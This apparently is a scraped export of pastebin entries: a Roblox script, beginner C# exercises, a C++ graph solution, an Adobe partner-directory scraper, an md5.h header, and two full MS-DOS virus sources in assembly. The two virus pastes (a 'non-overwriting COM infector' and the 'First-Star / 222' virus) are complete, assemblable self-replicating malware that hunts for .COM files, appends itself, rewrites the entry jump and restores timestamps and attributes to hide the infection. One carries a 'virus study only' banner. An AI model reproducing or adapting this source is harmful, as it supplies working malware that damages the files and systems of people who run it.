id,title,username,language,date,content
TRvSvkjW,Tool With Stacks (LocalScript),Sungmingamerpro13,CSS,Thursday 16th of May 2024 07:27:40 AM CDT,"local Tool = script.Parent

local player = game.Players.LocalPlayer

Tool.Activated:Connect(function()
	Tool.stacks.Value -= 1

	if Tool.stacks.Value == 0 then
		Tool:Destroy()
		player.Character.Humanoid.Health += 5
	end
end)
"
32wBc6MR,Orders,HRusev,C#,Thursday 16th of May 2024 07:25:08 AM CDT,"using System.Globalization;

namespace _11.Order
{
    class Program
    {
        static void Main(string[] args)
        {
            int order = Int32.Parse(Console.ReadLine());

            double priceCapsule;
            int days;
            int count;

            double sum;
            double total = 0;
            string result;

            for (int i = 0; i < order; i++)
            {
                priceCapsule = double.Parse(Console.ReadLine(), CultureInfo.InvariantCulture);
                days = Int32.Parse(Console.ReadLine());
                count = Int32.Parse(Console.ReadLine());

                sum = ((days * count) * priceCapsule);
                total += sum;

                result = sum.ToString(""C"", new CultureInfo(""en-US""));
                Console.WriteLine($""The price for the coffee is: ${sum, 0:N2}"");
            }


            result = total.ToString(""C"", new CultureInfo(""en-US""));
            Console.WriteLine($""Total: ${total, 0:N2}"");
        }
    }
}"
azB6Zsne,Rage Expenses,HRusev,C#,Thursday 16th of May 2024 07:24:17 AM CDT,"using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Globalization;

namespace _10.RageExpenses
{
    class Program
    {
        static void Main(string[] args)
        {
            int lostGames = Int32.Parse(Console.ReadLine());
            decimal priceHeadset = decimal.Parse(Console.ReadLine(), CultureInfo.InvariantCulture);
            decimal priceMouse = decimal.Parse(Console.ReadLine(), CultureInfo.InvariantCulture);
            decimal priceKeyboard = decimal.Parse(Console.ReadLine(), CultureInfo.InvariantCulture);
            decimal priceDisplay = decimal.Parse(Console.ReadLine(), CultureInfo.InvariantCulture);

            int trashedHeadset = 0;
            int trashedMouse = 0;
            int trashedKeyboard = 0;
            int trashedDisplay = 0;
            for (int i = 1; i <= lostGames; i++)
            {
                if (i % 2 == 0)
                    trashedHeadset++;
                if (i % 3 == 0)
                    trashedMouse++;
                if(i % 2 == 0 & i % 3 == 0)
                {
                    trashedKeyboard++;
                    if (trashedKeyboard % 2 == 0)
                        trashedDisplay++;
                }
            }

            decimal sum = priceHeadset * trashedHeadset + priceMouse * trashedMouse + priceKeyboard * trashedKeyboard + priceDisplay * trashedDisplay;

            Console.WriteLine($""Rage expenses: {sum, 0:N2} lv."");
            
        }
    }
}"
pULTFpRk,Padawan Equipment,HRusev,C#,Thursday 16th of May 2024 07:23:25 AM CDT,"using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Globalization;

namespace _09.PadawanEquipment
{
    class Program
    {
        static void Main(string[] args)
        {
            string line = Console.ReadLine();
            double money = double.Parse(line);

            line = Console.ReadLine();
            int countStudents = Int32.Parse(line);

            double priceLightsaber = double.Parse(Console.ReadLine(), CultureInfo.InvariantCulture);
            double priceRobe = double.Parse(Console.ReadLine(), CultureInfo.InvariantCulture);
            double priceBelt = double.Parse(Console.ReadLine(), CultureInfo.InvariantCulture);

            double needMoney = (priceLightsaber * Math.Ceiling(countStudents * 1.1)) + (priceRobe * countStudents) + (priceBelt * (countStudents - (countStudents / 6)));
       
            if (needMoney <= money)
                Console.WriteLine($""The money is enough - it would cost {needMoney, 0:N2}lv."");
            else
                Console.WriteLine($""John will need {needMoney - money, 0:N2}lv more."");

        }
    }
}
"
q1NQuPEQ,Ages,HRusev,C#,Thursday 16th of May 2024 07:22:20 AM CDT,"using System;

namespace Age
{
    class MainClass
    {
        public static void Main(string[] args)
        {
            string line = Console.ReadLine();
            int age = Int32.Parse(line);

            if (age < 3)
                Console.WriteLine(""baby"");
            else if(age < 14)
                Console.WriteLine(""child"");
            else if(age < 20)
                Console.WriteLine(""teenager"");
            else if(age < 65)
                Console.WriteLine(""adult"");
            else
                Console.WriteLine(""elder"");
        }
    }
}"
n4799ipg,Keys and Rooms,jayati,C++,Thursday 16th of May 2024 07:12:44 AM CDT,"class Solution {
public:
   void  dfs(int i, vector<vector<int>>& rooms, vector<bool>& vis){
       vis[i]=true;
       for(auto nbr:rooms[i]){
           if(!vis[nbr]){
                dfs(nbr, rooms, vis);
           }
       }
   }
    bool canVisitAllRooms(vector<vector<int>>& rooms) {
        int n = rooms.size();
        vector<bool> vis(n,false);
        dfs(0,rooms,vis);
        for(auto i:vis){
            if(!i)
                return false;
        }
        return true;
    }
};"
bY1GbK6D,Virus.MSDOS.Unknown.203 - Non-overwriting COM Infector - Source Code,FlyFar,ASM (NASM),Thursday 16th of May 2024 06:53:25 AM CDT,"
;******************************************************************
;*                                                                *
;*     My First Virus, a simple non-overwriting COM infector      *
;*                                                                *
;*                                  by, Solomon                   *
;*                                                                *
;******************************************************************

                  .model tiny                   ; Memory model
                  .code                         ; Start Code
                  org 100h                      ; Start of COM file

MAIN:             db 0e9h,00h,00h               ; Jmp START_VIRUS

START_VIRUS       proc near                     ; Real start of Virus
                  call FIND_OFFSET

; Calculate change in offset from host program.

FIND_OFFSET:      pop bp                        ; BP holds current IP
                  sub bp, offset FIND_OFFSET    ; Calculate net change
                                                ; Change BP to start of
                                                ; virus code

; Restore original bytes to the infected program.

                  lea si,[bp+ORIG_START]        ; Restore original 3 bytes
                  mov di,100h                   ; to 100h, start of file
                  push di                       ; Copy 3 bytes
                  movsw
                  movsb

; Change the DTA from the default so FINDFIRST/FINDNEXT won't destroy
; original command line parameters.

                  lea dx,[bp+NEW_DTA]           ; Point to new DTA area
                  call SET_DTA                  ; Go change it

; DOS Findfirst / Findnext services


FINDFIRST:        mov ah,4eh                    ; DOS find first service
                  lea dx,[bp+COM_MASK]          ; Search for any COM file
                  xor cx,cx                     ; Attribute mask
FINDNEXT:         int 21h                       ; Call DOS to do it
                  jc QUIT                       ; Quit if there are errors
                                                ; or no more files

; Ok, if I am here, then I found a possible victim. Open the file and
; check it for previous infections.

                  mov ax,3d00h                  ; DOS Open file, read only
                  lea dx,[bp+NEW_DTA+30]        ; Point to filename we found
                  int 21h                       ; Call DOS to do it
                  xchg ax,bx                    ; Put file handle in BX

; Check file for previous infection by checking for our presence at
; then end of the file.

                  mov ah,3fh                    ; DOS Read file
                  lea dx,[bp+ORIG_START]        ; Save the original header
                  mov cx,3                      ; Read 3 bytes
                  int 21h                       ; Call DOS to do it
                  mov ax,word ptr [bp+NEW_DTA+26]   ; Put filename in AX
                  mov cx,word ptr [bp+ORIG_START+1] ; Jmp offset
                  add cx,END_VIRUS-START_VIRUS+3; Convert to filesize
                  cmp ax,cx                     ; Compare file size's
                  jnz INFECT_COM                ; If healthy, go infect it
                  mov ah,3eh                    ; Otherwise close file and
                  int 21h                       ; try to find another victim
                  mov ah,4fh                    ; DOS find next file
                  jmp short FINDNEXT            ; Find another file

; Restore default DTA and pass control back to original program.
; Call any activation routines here.

QUIT:             mov dx,80h                    ; Restore original DTA
                  call SET_DTA                  ; Go change it
                  retn                          ; End Virus and start original
                                                ; Program. Remember, DI holding
                                                ; 100h was pushed on the stack.

;*** Subroutine INFECT_COM ***

INFECT_COM:

; Reset the file attributes to normal so I can write to the file

                  mov ax,4301h                  ; DOS change file attr
                  xor cx,cx                     ; Zero attributes
                  lea dx,[bp+NEW_DTA+30]        ; Point to filename in DTA
                  int 21h                       ; Call DOS to do it

; Calculate jump offset for header of victim so it will run virus first.

                  mov ax,word ptr [bp+NEW_DTA+26] ; Put filesize in AX
                  sub ax,3                      ; Subtract 3, size-jmp_code
                  mov word ptr [bp+JMP_OFFSET],ax ; Store new offset

; Close the file and reopen it for read/write. BX still holds file handle.

                  mov ah,3eh                    ; DOS close file
                  int 21h                       ; Call DOS to do it
                  mov ax,3d02h                  ; DOS open file, read/write
                  int 21h                       ; Call DOS to do it
                  xchg ax,bx                    ; Put file handle in BX

; Write the new header at the beginning of the file.

                  mov ah,40h                    ; DOS write to file
                  mov cx,3                      ; Write 3 bytes
                  lea dx,[bp+HEADER]            ; Point to the 3 bytes to write
                  int 21h                       ; Call DOS to do it

; Move to end of file so I can append the virus to it.

                  mov al,2                      ; Select end of file
                  call FILE_PTR                 ; Go to end of file

; Append the virus to the end of the file.

                  mov ah,40h                    ; DOS write to file
                  mov cx,END_VIRUS-START_VIRUS  ; Length of virus
                  lea dx,[bp+START_VIRUS]       ; Start from beginning of virus
                  int 21h                       ; Call DOS to do it

; Restore the file's original timestamp and datestamp.  These values were
; stored in the DTA by the Findfirst / Findnext services.

                  mov ax,5701h                  ; DOS set file date & time
                  mov cx,word ptr [bp+NEW_DTA+22] ; Set time
                  mov dx,word ptr [bp+NEW_DTA+24] ; Set date
                  int 21h                       ; Call DOS to do it

; Restore original file attributes.

                  mov ax,4301h                  ; DOS change file attr
                  mov cx,word ptr [bp+NEW_DTA+21] ; Get original file attr
                  lea dx,[bp+NEW_DTA+30]        ; Point to file name
                  int 21h                       ; Call DOS

; Lastly, close the file and go back to main program.

                  mov ah,3eh                    ; DOS close file
                  int 21h                       ; Call DOS to do it
                  jmp QUIT                      ; We're done

;*** Subroutine SET_DTA ***

SET_DTA           proc near
                  mov ah,1ah                    ; DOS set DTA
                  int 21h                       ; Call DOS to do it
                  retn                          ; Return
SET_DTA           endp


;*** Subroutine FILE_PTR ***


FILE_PTR          proc near
                  mov ah,42h                    ; DOS set read/write pointer
                  xor cx,cx                     ; Set offset move to zero
                  cwd                           ; Equivalent to xor dx,dx
                  int 21h                       ; Call DOS to do it
                  retn                          ; Return
FILE_PTR          endp



; This area will hold all variables to be encrypted

COM_MASK          db '*.com',0                  ; COM file mask

ORIG_START        db 0cdh,20h,0                 ; Header for infected file

HEADER            db 0e9h                       ; Jmp command for new header

START_VIRUS       endp

END_VIRUS         equ $                         ; Mark end of virus code

; This data area is a scratch area and is not included in virus code.

JMP_OFFSET        dw ?                          ; Jump offset for new header
NEW_DTA           db 43 dup(?)                  ; New DTA location

                  end MAIN
"
dc9TyfJ8,Virus.MSDOS.Unknown.1st_star - Source Code,FlyFar,ASM (NASM),Thursday 16th of May 2024 06:52:13 AM CDT,"
;****************************************************************************;
;                                                                            ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]                            [=-                     ;
;                     -=] For All Your H/P/A/V Files [=-                     ;
;                     -=]    SysOp: Peter Venkman    [=-                     ;
;                     -=]                            [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                                                                            ;
;                    *** NOT FOR GENERAL DISTRIBUTION ***                    ;
;                                                                            ;
; This File is for the Purpose of Virus Study Only! It Should not be Passed  ;
; Around Among the General Public. It Will be Very Useful for Learning how   ;
; Viruses Work and Propagate. But Anybody With Access to an Assembler can    ;
; Turn it Into a Working Virus and Anybody With a bit of Assembly Coding     ;
; Experience can Turn it Into a far More Malevolent Program Than it Already  ;
; Is. Keep This Code in Responsible Hands!                                   ;
;                                                                            ;
;****************************************************************************;
;
;       First-Star / 222 Virus
;
;       (C) by Glenn Benton in 1992
;       This is a non-resident direct action .COM infector in current dirs.
;
;
;
                Org 0h

Start:          Jmp MainVir
                Db '*'

MainVir:        Call On1
On1:            Pop BP
                Sub BP,Offset MainVir+3
                Push Ax
                Mov Ax,Cs:OrgPrg[BP]
                Mov Bx,Cs:OrgPrg[BP]+2
                Mov Cs:Start+100h,Ax
                Mov Cs:Start[2]+100h,Bx
		Mov Ah,1ah
		Mov Dx,0fd00h
		Int 21h
		Mov Ah,4eh
Search:         Lea Dx,FileSpec[BP]
		Xor Cx,Cx
		Int 21h
                Jnc Found
                Jmp Ready
Found:          Mov Ax,4300h
                Mov Dx,0fd1eh
                Int 21h
                Push Cx
                Mov Ax,4301h
                Xor Cx,Cx
                Int 21h
                Mov Ax,3d02h
                Int 21h
                Mov Bx,5700h
                Xchg Ax,Bx
                Int 21h
                Push Cx
                Push Dx
                Mov Ah,3fh
                Lea Dx,OrgPrg[BP]
                Mov Cx,4
                Int 21h
                Mov Ax,Cs:[OrgPrg][BP]
                Cmp Ax,'MZ'
                Je ExeFile
                Cmp Ax,'ZM'
                Je ExeFile
                Mov Ah,Cs:[OrgPrg+3][BP]
                Cmp Ah,'*'
                Jne Infect
ExeFile:        Call Close
                Mov Ah,4fh
                Jmp Search
FSeek:          Xor Cx,Cx
                Xor Dx,Dx
                Int 21h
                Ret
Infect:         Mov Ax,4202h
                Call FSeek
                Sub Ax,3
                Mov Cs:CallPtr[BP]+1,Ax
                Mov Ah,40h
                Lea Dx,MainVir[BP]
                Mov Cx,VirLen
                Int 21h
                Mov Ax,4200h
                Call FSeek
                Mov Ah,40h
                Lea Dx,CallPtr[BP]
                Mov Cx,4
                Int 21h
                Call Close
Ready:          Mov Ah,1ah
                Mov Dx,80h
                Int 21h
                Pop Ax
                Mov Bx,100h
                Push Cs
                Push Bx
                Retf
Close:          Pop Si
                Pop Dx
                Pop Cx
                Mov Ax,5701h
                Int 21h
                Mov Ah,3eh
                Int 21h
                Mov Ax,4301h
                Pop Cx
                Mov Dx,0fd1eh
                Int 21h
                Push Si
                Ret

CallPtr         Db 0e9h,0,0
FileSpec	Db '*.COM',0

OrgPrg:         Int 20h
                Nop
                Nop

VirLen          Equ $-MainVir

;****************************************************************************;
;                                                                            ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]                            [=-                     ;
;                     -=] For All Your H/P/A/V Files [=-                     ;
;                     -=]    SysOp: Peter Venkman    [=-                     ;
;                     -=]                            [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                                                                            ;
;                    *** NOT FOR GENERAL DISTRIBUTION ***                    ;
;                                                                            ;
; This File is for the Purpose of Virus Study Only! It Should not be Passed  ;
; Around Among the General Public. It Will be Very Useful for Learning how   ;
; Viruses Work and Propagate. But Anybody With Access to an Assembler can    ;
; Turn it Into a Working Virus and Anybody With a bit of Assembly Coding     ;
; Experience can Turn it Into a far More Malevolent Program Than it Already  ;
; Is. Keep This Code in Responsible Hands!                                   ;
;                                                                            ;
;****************************************************************************;

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ;
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ> and Remember Don't Forget to Call <ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ;
;ÄÄÄÄÄÄÄÄÄÄÄÄ> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <ÄÄÄÄÄÄÄÄÄÄ;
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ;

"
wmfsB7xR,adobe_partners_scraper.js,jayankaghosh,JavaScript,Thursday 16th of May 2024 06:51:46 AM CDT,"const fetch = require('node-fetch');
const fs = require('fs');
const json = require(""./partners.json"");
const createCsvWriter = require('csv-writer').createObjectCsvWriter;

const LISTING_URL = 'https://partner-directory.adobe.io/v1/spp/listings';
const DETAILS_URL = 'https://partner-directory.adobe.io/v1/spp/listing/';
const JSON_FILE_NAME = __dirname + '/partners.json';
const CSV_FILE_NAME = __dirname + '/partners.csv';
const TOTAL_THREADS = 10;

const fetchListingPage = pageNumber => {
    return new Promise(async (resolve, reject) => {
        console.log(`FETCHING PAGE ${ pageNumber }`);
        let url = LISTING_URL;
        if (pageNumber) {
            url += '?page=' + pageNumber
        }
        const rawResponse = await fetch(url, {
            headers: {
                'X-Api-Key': 'partner_directory'
            }
        });
        const response = await rawResponse.json();
        resolve(response);
    });
}

let numberOfTimesDetailsLogged = 0;
const fetchDetails = id => {
    return new Promise(async (resolve, reject) => {
        console.log(`${++numberOfTimesDetailsLogged}. FETCHING DETAILS OF ${ id }`);
        const url = DETAILS_URL + id;
        const rawResponse = await fetch(url, {
            headers: {
                'X-Api-Key': 'partner_directory'
            }
        });
        const response = await rawResponse.json();
        resolve(response);
    });
}

const writeCSVFromJSON = async () => {
    console.log('Writing to CSV');
    const json = require(JSON_FILE_NAME);
    const csvData = [];
    const csvWriter = createCsvWriter({
        path: CSV_FILE_NAME,
        header: [
            {id: 'name', title: 'Name'},
            {id: 'level', title: 'Level'},
            {id: 'certifiedEmployees', title: 'Certified Employees'},
            {id: 'phone', title: 'Phone'},
            {id: 'website', title: 'Website'},
            {id: 'city', title: 'City'},
            {id: 'country', title: 'Country'},
            {id: 'countryId', title: 'Country ID'},
            {id: 'headquarter', title: 'Headquarter'},
            {id: 'address_name', title: 'Address Name'},
            {id: 'postalCode', title: 'Postal Code'},
            {id: 'regionId', title: 'Region ID'},
            {id: 'state', title: 'State'},
            {id: 'address1', title: 'Address 1'},
            {id: 'address2', title: 'Address 2'}
        ]
    });
    Object.values(json).forEach(company => {
        company.addresses.forEach(address => {
            csvData.push({
                'name': company.companyInfo.name,
                'level': company.companyInfo.level,
                'certifiedEmployees': company.companyInfo.certifiedEmployees,
                'phone': company.companyInfo.phone,
                'website': company.companyInfo.website,
                'city': address.city,
                'country': address.country,
                'countryId': address.countryId,
                'headquarter': (address.isHeadquarter ? 'Yes': 'No'),
                'address_name': address.name,
                'postalCode': address.postalCode,
                'regionId': address.regionId,
                'state': address.state,
                'address1': address.address1,
                'address2': address.address2,
            })
        });
    });
    await csvWriter.writeRecords(csvData);
    console.log('DONE');
}

(async () => {
    let list = [];
    let totalItems;
    const finalList = {};
    let totalPages = null;
    let currentPage = 0;
    while (true) {
        const { listings = [], totalPages: pages = null, currentPage: current = null } = await fetchListingPage(currentPage);
        list = [...list, ...listings];
        if (pages) {
            totalPages = pages;
        }
        if (current) {
            currentPage = parseInt(current);
        }
        currentPage++;
        if (totalPages < currentPage) {
            break;
        }
    }
    totalItems = list.length;

    const runner = async () => {
        if (list.length) {
            const {id} = list.shift();
            finalList[id] = await fetchDetails(id);
            await runner();
        }
    }

    for (let i = 0; i < TOTAL_THREADS; i++) {
        runner();
    }

    const processId = setInterval(() => {
        if (Object.keys(finalList).length === totalItems) {
            clearInterval(processId);
            fs.writeFileSync(JSON_FILE_NAME, JSON.stringify(finalList, null, 2));
            console.log('DONE');
            console.log('JSON written to file ' + JSON_FILE_NAME);
            writeCSVFromJSON();
        }
    }, 1000);
})();

"
nWzRFd7u,md5/md5.h,FlyFar,C,Thursday 16th of May 2024 06:49:24 AM CDT,"

#ifndef _MD5_H
#define _MD5_H 1

#include <stdio.h>

#if defined HAVE_LIMITS_H || _LIBC
# include <limits.h>
#endif


#ifdef _LIBC
# include <sys/types.h>
typedef u_int32_t md5_uint32;
#else
# if defined __STDC__ && __STDC__
#  define UINT_MAX_32_BITS 4294967295U
# else
#  define UINT_MAX_32_BITS 0xFFFFFFFF
# endif


# ifndef UINT_MAX
#  define UINT_MAX UINT_MAX_32_BITS
# endif

# if UINT_MAX == UINT_MAX_32_BITS
   typedef unsigned int md5_uint32;
# else
#  if USHRT_MAX == UINT_MAX_32_BITS
    typedef unsigned short md5_uint32;
#  else
#   if ULONG_MAX == UINT_MAX_32_BITS
     typedef unsigned long md5_uint32;
#   else
     /* The following line is intended to evoke an error.
        Using #error is not portable enough.  */
     ""Cannot determine unsigned 32-bit data type.""
#   endif
#  endif
# endif
#endif

#undef __P
#if defined (__STDC__) && __STDC__
#define	__P(x) x
#else
#define	__P(x) ()
#endif


struct md5_ctx
{
  md5_uint32 A;
  md5_uint32 B;
  md5_uint32 C;
  md5_uint32 D;

  md5_uint32 total[2];
  md5_uint32 buflen;
  char buffer[128];
};


extern void md5_init_ctx __P ((struct md5_ctx *ctx));


extern void md5_process_block __P ((const void *buffer, size_t len,
				    struct md5_ctx *ctx));

extern void md5_process_bytes __P ((const void *buffer, size_t len,
				    struct md5_ctx *ctx));


extern void *md5_finish_ctx __P ((struct md5_ctx *ctx, void *resbuf));



extern void *md5_read_ctx __P ((const struct md5_ctx *ctx, void *resbuf));



extern int md5_stream __P ((FILE *stream, void *resblock));


extern void *md5_buffer __P ((const char *buffer, size_t len, void *resblock));

#endif
"
